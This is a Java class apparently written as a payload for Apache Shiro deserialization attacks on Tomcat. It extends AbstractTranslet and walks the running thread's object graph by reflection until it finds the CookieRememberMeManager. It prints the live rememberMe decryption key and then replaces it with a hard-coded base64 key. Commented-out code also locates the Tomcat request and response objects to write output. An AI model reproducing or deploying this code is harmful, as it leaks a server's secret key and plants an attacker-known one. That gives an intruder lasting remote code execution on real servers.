package org.example.spring_shiro;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.RequestFacade;
import org.apache.catalina.connector.Response;
import org.apache.shiro.codec.Base64;
import org.apache.shiro.web.mgt.CookieRememberMeManager;

import java.io.IOException;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.util.*;
/**
 * author: f19t
 * Date: 2023/3/6 15:35
 */
public class location extends AbstractTranslet {

    public location(Object obj, String clazz, String path) {
        this.obj = obj;
        this.path = path;
        this.clazz = clazz;
    }
    public Object obj;
    public String path;
    public String clazz;
    public static Queue<location> queue = new LinkedList<location>();//队列保证广度优先搜索
    public static Set<Object> set = new HashSet<Object>();//set记录哪些对象被搜索过


    public static void search() throws ClassNotFoundException {
        location laco = new location(Thread.currentThread(), "org.apache.tomcat.util.threads.TaskThread","TaskThread");
        queue.offer(laco);
        set.add(Thread.currentThread());
        int i=0;
        while (queue.size()>0) {
            i++;
            basic_search1(queue.poll());
//            if (i==500){break;}
        }
    }

    public static void basic_search1(location lcat) throws ClassNotFoundException {

        Object obj = lcat.obj;
        String path = lcat.path;
        Class clazz = lcat.obj.getClass();


        try {
//            Class clazz = Class.forName("org.apache.tomcat.util.threads.TaskThread");
            for (; clazz != Object.class; clazz = clazz.getSuperclass()) {

                Field fields[] = clazz.getDeclaredFields();

                for (int i = 0; i < fields.length; i++) {
                    fields[i].setAccessible(true);
                    if (fields[i].get(obj) == null){continue;}


                    if (!isblack(fields[i].getType().getName()) && fields[i].get(obj) != null && set.add(fields[i].get(obj))) {
                        if (is_map(fields[i].getType().getSimpleName())) {
                            Map map = (Map) fields[i].get(obj);
                            if (map.size() > 0) {
                                for (int map_num = 0; map_num < map.size(); map_num++) {
                                    Object map_obj = map.get(map_num);
                                    if (map_obj != null && set.add(map_obj) && !isblack(map_obj.getClass().getName())) {
                                        location l = new location(map_obj, map_obj.getClass().getName(), path + "-->" + fields[i].getName() + "[" + map_num + "]"+map_obj.getClass().getName());
//                                        System.out.println(path + "-->" + fields[i].getName() + "[" + map_num + "]");
                                        queue.offer(l);
                                    }

                                }
                            }
                            continue;
                        } else if (is_list(fields[i].getType().getSimpleName())) {
                            List list = (List) fields[i].get(obj);
                            if (list.size() > 0) {
                                for (int list_num = 0; list_num < list.size(); list_num++) {
                                    Object list_obj = list.get(list_num);
                                    if (list_obj != null && set.add(list_obj) && !isblack(list_obj.getClass().getName())) {
                                        location l = new location(list_obj, list_obj.getClass().getName(), path + "-->" + fields[i].getName() + "[" + list_num + "]"+list_obj.getClass().getName());
//                                        System.out.println(path + "-->" + fields[i].getName() + list_obj.getClass().getName()+"[" + list_num + "]");
                                        queue.offer(l);
                                    }

                                }
                            }
                            continue;
                        }
                        else if (fields[i].getType().isArray()) {

//                            Object objarr1 = fields[i].get(obj);



                            try {
                                Object[] arrobj = (Object[])fields[i].get(obj);
                                if (arrobj.length > 0) {
                                    for (int obj_num = 0; obj_num < arrobj.length; obj_num++) {
                                        Object arr_obj = arrobj[obj_num];
                                        if (arr_obj != null && set.add(arr_obj) && !isblack(arr_obj.getClass().getName())) {
                                            location l = new location(arr_obj, arr_obj.getClass().getName(), path + "-->" + fields[i].getName() + "[" + obj_num + "]"+arr_obj.getClass().getName());
//                                            System.out.println(path + "-->" + fields[i].getClass().getName() + "[" + obj_num + "]");
                                            queue.offer(l);
                                        }

                                    }
                                }
                            }catch (Throwable e){
//                                System.out.println(fields[i].get(obj));
                            }



                            continue;
                        }
                        if (is_target(fields[i],obj)) {
                            System.out.println(path+"--->"+fields[i].getName()+"("+fields[i].get(obj).getClass().getName()+")");
                            CookieRememberMeManager cookieRememberMeManager = (CookieRememberMeManager) fields[i].get(obj);
                            System.out.println( Base64.encodeToString(cookieRememberMeManager.getDecryptionCipherKey()));
                            cookieRememberMeManager.setCipherKey(Base64.decode("3AvVhmFLUs0KTA3Kprsdag=="));

//                            RequestFacade reqfd = (RequestFacade) fields[i].get(obj);
//                            Field f = reqfd.getClass().getDeclaredField("request");
//                            f.setAccessible(true);//因为是protected
//                            Request req = (Request) f.get(reqfd);//反射获取值
//                            Field ff = req.getClass().getDeclaredField("response");
//                            ff.setAccessible(true);
//                            Response resp = (Response) ff.get(req);
//                            PrintWriter out = resp.getWriter();
//                            out.println("wwwwww");
                        }
                        location l = new location(fields[i].get(obj), fields[i].get(obj).getClass().getName(), path+"--->"+fields[i].getName()+"("+fields[i].get(obj).getClass().getName()+")");
                        queue.offer(l);
//                        System.out.println(path+"--->"+fields[i].getName()+"("+fields[i].get(obj).getClass().getName()+")");

                    }
                }
            }
        } catch (IllegalAccessException ex) {
            throw new RuntimeException(ex);
        }
    }
    public static boolean isblack(String s) {
        Boolean aBoolean = false;
        List<String> black = new ArrayList<String>(Arrays.asList("java.lang.Byte",
                "java.lang.Short",
                "java.lang.Integer",
                "java.lang.Long",
                "java.lang.Float",
                "java.lang.Boolean",
                "java.lang.String",
                "java.lang.Class",
                "java.lang.Character",

                "java.io.File",
                "byte",
                "short",
                "int",
                "long",
                "double",
                "float",
                "boolean"
        ));

        for (int i = 0; i < black.size(); i++) {
            if (s == black.get(i)) {
                aBoolean = true;
                return aBoolean;
            }
        }
        return aBoolean;
    }
    public static boolean is_target(Field f,Object o) throws IllegalAccessException, ClassNotFoundException {
        boolean b = false;
        if (
//                f.getName() == "request"
//                || f.get(o).getClass().getName() == "org.apache.catalina.connector.RequestFacade"
//                || f.get(o).getClass().getName() == "org.apache.catalina.connector.Request"
//                || f.get(o).getClass().isAssignableFrom(Class.forName("org.apache.catalina.connector.Request"))
//                || f.get(o).getClass().isAssignableFrom(Class.forName("org.apache.catalina.core.ApplicationHttpRequest"))
//                f.get(o).getClass().isAssignableFrom(Class.forName("org.apache.catalina.connector.RequestFacade"))
                f.get(o).getClass().getName().contains("CookieRememberMeManager")

//                || f.get(o).getClass().isAssignableFrom(Class.forName("org.apache.catalina.connector.RequestFacade"))
//                || f.get(o).getClass().getName() == "org.apache.catalina.core.ApplicationHttpRequest"
//                || f.get(o).getClass().getName() == "org.apache.coyote.Request"
//                || f.get(o).getClass().getSimpleName() == "Request"
//                || f.get(o).getClass().getSimpleName() == "HttpServletRequest"
//                || f.getName() == "req"

//                || f.get(o).getClass().getName() == "org.apache.coyote.RequestGroupInfo")
//                && f.get(o).getClass().getName()!="java.lang.Object"

        ){
            return true;
        }

        return b;

    }
    public static boolean is_list(String s) {
        boolean b = false;
        if ("List".equals(s) || "ArrayList".equals(s)){
            b = true;
            return b;
        }
        return b;
    }
    public static boolean is_map(String s) {
        boolean b = false;
        if ("Map".equals(s) || "HashMap".equals(s)){
            b = true;
            return b;
        }
        return b;

    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}




